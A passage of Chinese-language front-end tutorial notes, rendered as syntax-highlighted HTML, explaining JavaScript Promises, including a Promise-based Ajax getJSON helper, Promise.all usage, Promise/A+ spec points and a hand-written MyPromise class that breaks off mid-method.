    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">//promise简写</span>
<span class="token keyword">const</span> <span class="token function-variable function">delayPms</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//通过async封装</span>
    <span class="token keyword">var</span> temple<span class="token operator">=</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>isDelay<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> <span class="token function">delayPms</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> temple
<span class="token punctuation">}</span>
<span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//延迟1000ms输出了1111</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><blockquote><h5 id="用promise对象实现的ajax操作"><a href="#用promise对象实现的ajax操作" class="header-anchor">#</a> 用Promise对象实现的Ajax操作</h5></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">getJSON</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    client<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    client<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> handler<span class="token punctuation">;</span>
    client<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">&quot;json&quot;</span><span class="token punctuation">;</span>
    client<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    client<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">!==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> promise<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">getJSON</span><span class="token punctuation">(</span><span class="token string">&quot;/posts.json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">json</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Contents: '</span> <span class="token operator">+</span> json<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'出错了'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 生成一个Promise对象的数组</span>
<span class="token keyword">var</span> promises <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">getJSON</span><span class="token punctuation">(</span><span class="token string">&quot;/post/&quot;</span> <span class="token operator">+</span> id <span class="token operator">+</span> <span class="token string">&quot;.json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>promises<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">posts</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="_3-promise"><a href="#_3-promise" class="header-anchor">#</a> 3:promise</h4> <h5 id="规范及常用api"><a href="#规范及常用api" class="header-anchor">#</a> 规范及常用api</h5> <p><strong>Promise/A+ 规范</strong></p> <p>规范虽然不长，但细节也比较多，几个要点简单说明下：</p> <ol><li><strong>Promise 本质是一个状态机</strong>。每个 promise 只能是 3 种状态中的一种：pending、fulfilled 或 rejected。<strong>状态转变只能是 pending -&gt; fulfilled 或者 pending -&gt; rejected。状态转变不可逆。</strong></li> <li><strong>then 方法可以被同一个 promise 调用多次</strong>。</li> <li>**then 方法必须返回一个 promise。**规范里没有明确说明返回一个新的 promise 还是复用老的 promise（即 return this），大多数实现都是返回一个新的 promise，而且复用老的 promise 可能改变内部状态，这与规范也是相违背的。</li> <li><strong>值穿透。</strong></li></ol> <p><strong>静态方法(4个)</strong></p> <ul><li>Promise.resolve 返回一个fulfilled状态的promise对象</li> <li>Promise.reject 返回一个rejected状态的promise对象</li> <li>Promise.all(Arr)接受一个promise对象的数组，<strong>待全部完成之后，统一执行success</strong></li> <li>Promise.race接受一个包含多个promise对象的数组，<strong>只要有一个完成，就执行success</strong></li> <li><strong>Promise.allSettled(Arr)接受一个promise对象的数组;</strong></li> <li><strong>Promise.any(Arr)接受一个promise对象的数组，any与all相反; 【目前还是试验性阶段】</strong></li></ul> <p>区别：一句话概括Promise.allSettled和Promise.all的最大不同：<strong>Promise.allSettled永远不会被reject</strong>。</p> <ul><li><code>Promise.all</code> 将在 Promises 数组中的<strong>其中一个 Promises 失败后立即失败</strong>。</li> <li><code>Promise.allSettled</code>将永远不会失败，一旦数组中的<strong>所有 Promises 被完成或失败，它就会完成</strong>。</li></ul> <p><strong>属性方法(3个)</strong></p> <ul><li>Promise.prototype.then</li> <li>Promise.prototype.catch</li> <li>Promise.prototype.finally()</li></ul> <p><strong>Promise.all的使用实践</strong></p> <p><strong>如果不存在继发关系，最好让它们用Promise.all同时触发</strong>； let [a, b] = await Promise.all([a(), b()]);</p> <blockquote><h5 id="_10-个-ajax-同时发起请求-全部返回展示结果-并且至多允许三次失败-说出设计思路"><a href="#_10-个-ajax-同时发起请求-全部返回展示结果-并且至多允许三次失败-说出设计思路" class="header-anchor">#</a> 10 个 Ajax 同时发起请求，全部返回展示结果，并且至多允许三次失败，说出设计思路</h5></blockquote> <p>第一时间想到 <code>Promise.all</code> ，<strong>但是这个函数有一个局限在于如果失败一次就返回了</strong>，直接这样实现会有点问题，需要变通下。<strong>以下是两种实现思路</strong>：记住错误及正常的的数量；再做返回判断；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// Promise 写法</span>
<span class="token keyword">let</span> errorCount <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
         errorCount<span class="token operator">++</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span>errorCount <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 失败次数大于3次就应该报错；</span>
            <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">//// 失败次数小于3次时，正常返回；</span>
             <span class="token function">resolve</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h5 id="自定义实现-2"><a href="#自定义实现-2" class="header-anchor">#</a> 自定义实现</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 判断变量否为function</span>
<span class="token keyword">const</span> <span class="token function-variable function">isFunction</span> <span class="token operator">=</span> <span class="token parameter">variable</span> <span class="token operator">=&gt;</span> <span class="token keyword">typeof</span> variable <span class="token operator">===</span> <span class="token string">'function'</span>
<span class="token comment">// 定义Promise的三种状态常量</span>
<span class="token keyword">const</span> <span class="token constant">PENDING</span> <span class="token operator">=</span> <span class="token string">'PENDING'</span>
<span class="token keyword">const</span> <span class="token constant">FULFILLED</span> <span class="token operator">=</span> <span class="token string">'FULFILLED'</span>
<span class="token keyword">const</span> <span class="token constant">REJECTED</span> <span class="token operator">=</span> <span class="token string">'REJECTED'</span>

<span class="token keyword">class</span> <span class="token class-name">MyPromise</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">handle</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isFunction</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'MyPromise must accept a function as a parameter'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">=</span> <span class="token constant">PENDING</span><span class="token comment">// 添加状态</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> <span class="token keyword">undefined</span> <span class="token comment">// 添加状态; value 变量用于保存 resolve 或者 reject 中传入的值</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_fulfilledQueues <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">// 添加成功回调函数队列</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_rejectedQueues <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// 添加失败回调函数队列</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token comment">// 执行handle</span>
      <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_resolve</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_reject</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">_resolve</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加resovle时执行的函数</span>
    <span class="token keyword">const</span> <span class="token function-variable function">run</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">//首先得判断当前状态是否为等待中，因为规范规定只有等待态才可以改变状态</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">!==</span> <span class="token constant">PENDING</span><span class="token punctuation">)</span> <span class="token keyword">return</span>
      <span class="token keyword">const</span> <span class="token function-variable function">runFulfilled</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 依次执行成功队列中的函数，并清空队列</span>
        <span class="token keyword">let</span> cb<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>cb <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_fulfilledQueues<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">cb</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//that._fulfilledQueues.map(cb =&gt; cb(that.value))</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">const</span> <span class="token function-variable function">runRejected</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 依次执行失败队列中的函数，并清空队列</span>
        <span class="token keyword">let</span> cb<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>cb <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_rejectedQueues<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">cb</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token comment">/* 如果resolve的参数为Promise对象，则必须等待该Promise对象状态改变后,
        当前Promsie的状态才会改变，且状态取决于参数Promsie对象的状态
      */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token keyword">instanceof</span> <span class="token class-name">MyPromise</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        val<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> value
          <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">=</span> <span class="token constant">FULFILLED</span>
          <span class="token function">runFulfilled</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> err
          <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">=</span> <span class="token constant">REJECTED</span>
          <span class="token function">runRejected</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> val
        <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">=</span> <span class="token constant">FULFILLED</span>
        <span class="token function">runFulfilled</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>run<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">// 为了支持同步的Promise，这里采用异步调用</span>
  <span class="token punctuation">}</span>
  
  <span class="token function">_reject</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加reject时执行的函数</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">!==</span> <span class="token constant">PENDING</span><span class="token punctuation">)</span> <span class="token keyword">return</span>
    <span class="token keyword">const</span> <span class="token function-variable function">run</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 依次执行失败队列中的函数，并清空队列</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">=</span> <span class="token constant">REJECTED</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> err
      <span class="token keyword">let</span> cb<span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>cb <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_rejectedQueues<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cb</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>run<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// 为了支持同步的Promise，这里采用异步调用</span>
  <span class="token punctuation">}</span>
  
  <span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">onFulfilled<span class="token punctuation">,</span> onRejected</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 添加then方法</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> _value<span class="token punctuation">,</span> _status <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyPromise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">onFulfilledNext<span class="token punctuation">,</span> onRejectedNext</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 返回一个新的Promise对象</span>
      <span class="token keyword">let</span> <span class="token function-variable function">fulfilled</span> <span class="token operator">=</span> <span class="token parameter">value</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 封装一个成功时执行的函数</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isFunction</span><span class="token punctuation">(</span>onFulfilled<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">onFulfilledNext</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">onFulfilled</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token keyword">instanceof</span> <span class="token class-name">MyPromise</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span>
              res<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>onFulfilledNext<span class="token punctuation">,</span> onRejectedNext<span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
              <span class="token comment">//否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span>
              <span class="token function">onFulfilledNext</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 如果函数执行出错，新的Promise对象的状态为失败</span>
          <span class="token function">onRejectedNext</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">let</span> <span class="token function-variable function">rejected</span> <span class="token operator">=</span> <span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 封装一个失败时执行的函数</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isFunction</span><span class="token punctuation">(</span>onRejected<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">onRejectedNext</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">onRejected</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token keyword">instanceof</span> <span class="token class-name">MyPromise</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span>
              res<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>onFulfilledNext<span class="token punctuation">,</span> onRejectedNext<span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
              <span class="token comment">//否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span>
              <span class="token function">onFulfilledNext</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 如果函数执行出错，新的Promise对象的状态为失败</span>
          <span class="token function">onRejectedNext</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span>_status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token constant">PENDING</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span> 当状态为pending时，将then方法回调函数加入执行队列等待执行
          <span class="token keyword">this</span><span class="token punctuation">.</span>_fulfilledQueues<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fulfilled<span class="token punctuation">)</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>_rejectedQueues<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>rejected<span class="token punctuation">)</span>
          <span class="token keyword">break</span>
        <span class="token keyword">case</span> <span class="token constant">FULFILLED</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span> 当状态已经改变时，立即执行对应的回调函数
          <span class="token function">fulfilled</span><span class="token punctuation">(</span>_value<span class="token punctuation">)</span>
          <span class="token keyword">break</span>
        <span class="token keyword">case</span> <span class="token constant">REJECTED</span><span class="token operator">:</span>
          <span class="token function">rejected</span><span class="token punctuation">(</span>_value<span class="token punctuation">)</span>
          <span class="token keyword">break</span>
      <span class="token punctuation">}</span>
